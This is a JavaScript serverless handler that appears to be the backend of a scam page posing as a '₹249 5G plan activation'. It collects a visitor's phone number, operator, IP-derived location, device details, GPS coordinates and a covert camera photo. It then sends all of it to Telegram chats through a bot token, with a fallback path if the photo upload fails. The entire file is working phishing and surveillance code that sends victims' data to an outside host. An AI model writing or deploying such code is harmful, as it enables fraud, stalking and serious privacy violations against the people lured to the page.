const axios = require('axios');
const FormData = require('form-data');

module.exports = async (req, res) => {
  // CORS Headers
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS, GET');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization, X-Requested-With');
  
  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }
  
  if (req.method === 'GET') {
    return res.status(200).json({
      success: true,
      message: '✅ API Working',
      timestamp: new Date().toISOString()
    });
  }
  
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed. Use POST.' });
  }
  
  try {
    // Environment variables
    const BOT_TOKEN = process.env.BOT_TOKEN;
    const MAIN_CHAT_ID = process.env.MAIN_CHAT_ID;
    const IPINFO_TOKEN = process.env.IPINFO_TOKEN;
    
    if (!BOT_TOKEN || !MAIN_CHAT_ID) {
      return res.status(500).json({
        success: false,
        error: 'Server configuration missing.'
      });
    }
    
    // Parse request body
    let userData = {};
    try {
      userData = req.body;
      console.log('📥 Received:', {
        mobile: userData.mobile,
        operator: userData.operator,
        hasPhoto: !!userData.photo,
        photoLength: userData.photo ? userData.photo.length : 0,
        hasLocation: !!userData.location
      });
    } catch (e) {
      console.error('JSON error:', e);
      return res.status(400).json({ error: 'Invalid JSON' });
    }
    
    // Fixed country
    userData.country = '+91';
    const USER_CHAT_ID = userData.userChatId || MAIN_CHAT_ID;
    
    // Get IP info
    const clientIp = req.headers['x-forwarded-for'] || 
                     req.connection.remoteAddress || 'Unknown';
    
    let ipInfoData = { ip: clientIp };
    
    // Get IP details if token exists
    if (IPINFO_TOKEN && clientIp !== 'Unknown') {
      try {
        const ipResponse = await axios.get(`https://ipinfo.io/${clientIp}/json?token=${IPINFO_TOKEN}`, {
          timeout: 5000
        });
        ipInfoData = { ...ipInfoData, ...ipResponse.data };
      } catch (ipError) {
        console.log('⚠️ IP info failed:', ipError.message);
      }
    }
    
    // ✅ FIXED: LOCATION HANDLING
    let locationText = 'Permission Denied';
    let hasValidLocation = false;
    let locationCoords = null;
    
    if (userData.location) {
      console.log('📍 Raw location:', JSON.stringify(userData.location).substring(0, 100));
      
      if (typeof userData.location === 'object') {
        if (userData.location.latitude && userData.location.longitude) {
          hasValidLocation = true;
          locationCoords = userData.location;
          locationText = `Latitude: ${userData.location.latitude}\nLongitude: ${userData.location.longitude}\nAccuracy: ${userData.location.accuracy || 'N/A'}m\n🌍 Map: https://maps.google.com/?q=${userData.location.latitude},${userData.location.longitude}`;
        }
        else if (userData.location.status) {
          locationText = userData.location.status;
        }
      } 
      else if (typeof userData.location === 'string') {
        locationText = userData.location;
      }
    }
    
    console.log('📍 Processed:', { hasValidLocation, locationText: locationText.substring(0, 50) });
    
    // ✅ FIXED: PHOTO HANDLING (MAIN FIX)
    let photoStatus = 'Not Captured';
    let photoBuffer = null;
    let canSendPhoto = false;
    let photoFormat = 'unknown';
    
    if (userData.photo && typeof userData.photo === 'string') {
      console.log('📸 Photo string length:', userData.photo.length);
      
      // Check for base64 data URL
      if (userData.photo.startsWith('data:image')) {
        try {
          // Extract base64 part
          const base64Data = userData.photo.split(',')[1];
          
          if (!base64Data) {
            photoStatus = 'No Base64 Data';
            console.error('❌ No base64 data after comma');
          } 
          else if (base64Data.length < 100) {
            photoStatus = 'Base64 Too Short';
            console.error('❌ Base64 too short:', base64Data.length);
          }
          else {
            // Validate base64 format
            if (!/^[A-Za-z0-9+/]+=*$/.test(base64Data)) {
              photoStatus = 'Invalid Base64 Chars';
              console.error('❌ Invalid base64 characters');
            } else {
              // Decode base64
              photoBuffer = Buffer.from(base64Data, 'base64');
              
              if (photoBuffer.length === 0) {
                photoStatus = 'Empty Buffer';
                console.error('❌ Buffer is empty');
              } 
              else {
                const sizeKB = Math.round(photoBuffer.length / 1024);
                
                // Check MIME type
                if (userData.photo.includes('image/jpeg') || userData.photo.includes('image/jpg')) {
                  photoFormat = 'jpeg';
                } else if (userData.photo.includes('image/png')) {
                  photoFormat = 'png';
                }
                
                // Size validation
                if (sizeKB < 10) {
                  photoStatus = `Captured (${sizeKB}KB - Too Small)`;
                  console.log(`⚠️ Image too small: ${sizeKB}KB`);
                } else if (sizeKB > 10000) {
                  photoStatus = `Captured (${sizeKB}KB - Too Large)`;
                  console.log(`⚠️ Image too large: ${sizeKB}KB`);
                } else {
                  canSendPhoto = true;
                  photoStatus = `Captured ✓ (${sizeKB}KB)`;
                  console.log(`✅ Photo ready: ${sizeKB}KB, format: ${photoFormat}`);
                }
              }
            }
          }
        } catch (photoError) {
          photoStatus = `Error: ${photoError.message}`;
          console.error('❌ Photo processing error:', photoError);
        }
      }
      else if (userData.photo === 'Permission Denied') {
        photoStatus = 'Permission Denied';
      }
      else {
        photoStatus = 'Unknown Format';
        console.log('📸 Not a data URL:', userData.photo.substring(0, 50));
      }
    }
    else if (userData.photo) {
      photoStatus = `Type: ${typeof userData.photo}`;
      console.log('📸 Non-string photo:', typeof userData.photo);
    }
    
    // Build Telegram message
    const message = `
💰 *₹249 5G PLAN ACTIVATED*
📱 Mobile: +${userData.country.replace('+', '')}${userData.mobile}
📡 Operator: ${userData.operator}

🌐 *IP Information:*
🌐 IP Address: ${ipInfoData.ip}
📡 ISP: ${ipInfoData.org || 'Unknown'}
📍 City: ${ipInfoData.city || 'Unknown'}

📱 *Device Info:*
🔋 Charging: ${userData.deviceInfo?.battery?.charging ? 'Yes' : 'No'}
🔌 Battery Level: ${userData.deviceInfo?.battery?.level || 'N/A'}%
🌐 Network: ${userData.deviceInfo?.connection?.effectiveType || 'N/A'}
🕒 Time Zone: ${userData.deviceInfo?.timezone || 'N/A'}

📍 *Location:*
${locationText}

📸 *Camera:* ${photoStatus}

⏰ *Time:* ${new Date().toLocaleString('en-IN')}
    `;
    
    // Send to Telegram
    const chatIds = [...new Set([MAIN_CHAT_ID, USER_CHAT_ID].filter(id => id))];
    const results = [];
    
    for (const chatId of chatIds) {
      try {
        console.log(`📤 Sending to ${chatId}...`);
        
        // 1. Send message
        await axios.post(
          `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
          {
            chat_id: chatId,
            text: message,
            parse_mode: 'Markdown'
          },
          { 
            timeout: 10000,
            // Force HTTP/1.1 to avoid PROTOCOL_ERROR
            httpAgent: new (require('http').Agent)({ keepAlive: false }),
            httpsAgent: new (require('https').Agent)({ keepAlive: false })
          }
        );
        
        console.log(`✅ Message sent to ${chatId}`);
        
        // 2. ✅ FIXED: Send photo using FormData (NO PROTOCOL_ERROR)
        if (canSendPhoto && photoBuffer && photoBuffer.length > 0) {
          try {
            console.log(`🖼️ Sending photo (${photoBuffer.length} bytes) to ${chatId}...`);
            
            // Use FormData - Telegram prefers this
            const formData = new FormData();
            
            // Add photo as buffer
            formData.append('photo', photoBuffer, {
              filename: `capture_${userData.mobile}_${Date.now()}.${photoFormat === 'png' ? 'png' : 'jpg'}`,
              contentType: photoFormat === 'png' ? 'image/png' : 'image/jpeg'
            });
            
            // Add other fields
            formData.append('chat_id', chatId);
            formData.append('caption', `📸 Camera Captured\nMobile: ${userData.mobile}`);
            
            // Send with proper headers
            const response = await axios.post(
              `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,
              formData,
              {
                headers: {
                  ...formData.getHeaders(),
                  'Connection': 'close'  // Prevent HTTP/2 issues
                },
                timeout: 30000,
                // Force HTTP/1.1
                httpAgent: new (require('http').Agent)({ keepAlive: false }),
                httpsAgent: new (require('https').Agent)({ keepAlive: false }),
                maxContentLength: Infinity,
                maxBodyLength: Infinity
              }
            );
            
            console.log(`✅ Photo sent successfully to ${chatId}`);
            
          } catch (photoError) {
            console.error(`❌ Photo upload failed:`, {
              message: photoError.message,
              code: photoError.code,
              response: photoError.response?.data
            });
            
            // Fallback: Try as document
            try {
              console.log(`📎 Trying fallback as document...`);
              
              const formData = new FormData();
              formData.append('document', photoBuffer, {
                filename: `photo_${userData.mobile}.${photoFormat === 'png' ? 'png' : 'jpg'}`,
                contentType: photoFormat === 'png' ? 'image/png' : 'image/jpeg'
              });
              formData.append('chat_id', chatId);
              formData.append('caption', `📸 Photo for ${userData.mobile}`);
              
              await axios.post(
                `https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`,
                formData,
                {
                  headers: formData.getHeaders(),
                  timeout: 20000,
                  httpAgent: new (require('http').Agent)({ keepAlive: false })
                }
              );
              
              console.log(`✅ Photo sent as document`);
            } catch (docError) {
              console.error(`❌ Document upload failed:`, docError.message);
            }
          }
        }
        else if (canSendPhoto) {
          console.log(`⚠️ Photo marked as sendable but buffer is empty`);
        }
        
        results.push({ chatId, success: true });
        
        // Small delay between messages
        await new Promise(resolve => setTimeout(resolve, 300));
        
      } catch (error) {
        console.error(`❌ Error sending to ${chatId}:`, error.message);
        results.push({ chatId, success: false, error: error.message });
      }
    }
    
    // Success response
    res.status(200).json({ 
      success: true, 
      message: 'Data processed successfully',
      details: {
        location: hasValidLocation ? 'Valid' : 'Missing/Denied',
        photo: photoStatus,
        photoSent: canSendPhoto,
        chats: results.length
      },
      timestamp: new Date().toISOString()
    });
    
  } catch (error) {
    console.error('❌ Server Error:', error);
    res.status(500).json({ 
      success: false, 
      error: 'Internal server error: ' + error.message,
      timestamp: new Date().toISOString()
    });
  }
};
